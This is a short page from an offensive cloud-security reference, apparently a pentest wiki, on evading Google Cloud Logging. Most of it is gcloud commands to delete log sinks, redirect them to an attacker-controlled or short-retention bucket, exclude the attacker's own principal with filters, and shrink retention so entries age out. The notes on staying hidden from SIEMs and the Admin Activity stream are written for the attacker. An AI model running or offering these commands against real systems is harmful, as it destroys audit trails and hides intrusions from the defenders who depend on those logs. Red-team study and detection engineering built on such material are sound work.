---
title: "Cloud Logging: deleting and diverting log sinks"
order: 1
description: "Deleting or diverting Cloud Logging sinks and exclusions to drop attacker activity from the logs."
keywords:
  - Cloud Logging
  - log sink
  - exclusion
  - logging.sinks
  - log tampering
  - detection evasion
---

# Cloud Logging

The Log Router sends every log entry through **sinks** to their destinations (a logging bucket, Cloud Storage, BigQuery, or Pub/Sub, including an aggregated org-level sink to a SIEM). Control over the sinks, or over the exclusion filters that sit in front of them, lets you stop your activity from ever reaching where defenders read it. `logging.sinks.*` and `logging.logEntries.*` permissions are the levers.

## Enumerate the routing

```bash
gcloud logging sinks list
gcloud logging sinks describe <sink>              # destination and filter
gcloud logging buckets list --location=global
```

## Drop the destination or redirect it

```bash
# delete a sink so its destination stops receiving entries
gcloud logging sinks delete <sink>

# or repoint it at a bucket you control, or one with 1-day retention
gcloud logging sinks update <sink> \
  storage.googleapis.com/<attacker-or-short-retention-bucket>
```

## Exclude only your activity

Quieter than deleting a sink: add an exclusion filter so the entries you are about to generate are never routed.

```bash
# drop entries for a principal or resource at the sink
gcloud logging sinks update _Default \
  --add-exclusion=name=x,filter='protoPayload.authenticationInfo.principalEmail="attacker@example.com"'

# or shorten retention on the _Default bucket so entries age out fast
gcloud logging buckets update _Default --location=global --retention-days=1
```

## Exploitation notes

- Sink and exclusion changes are themselves Admin Activity events, which cannot be turned off, so the tampering call is visible even when it stops later entries; it is clean only if nothing is watching the Admin Activity stream in real time.
- An **aggregated org or folder sink** shipping to an external SIEM is outside a project-level principal's reach, so confirm where logs land before relying on silence.
- An exclusion on `_Default` does not touch a separate sink to a SIEM; enumerate every sink, not just `_Default`.

## Tools

- **gcloud** (`logging sinks`, `logging buckets`): all of the above.
- **ScoutSuite** / **Prowler**: enumerate sink and retention configuration first.

## References

- [HackTricks Cloud: GCP log evasion](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/index.html)
- [Stratus Red Team: GCP techniques](https://stratus-red-team.cloud/attack-techniques/GCP/)
- [Google: Log Router and sinks](https://cloud.google.com/logging/docs/routing/overview)
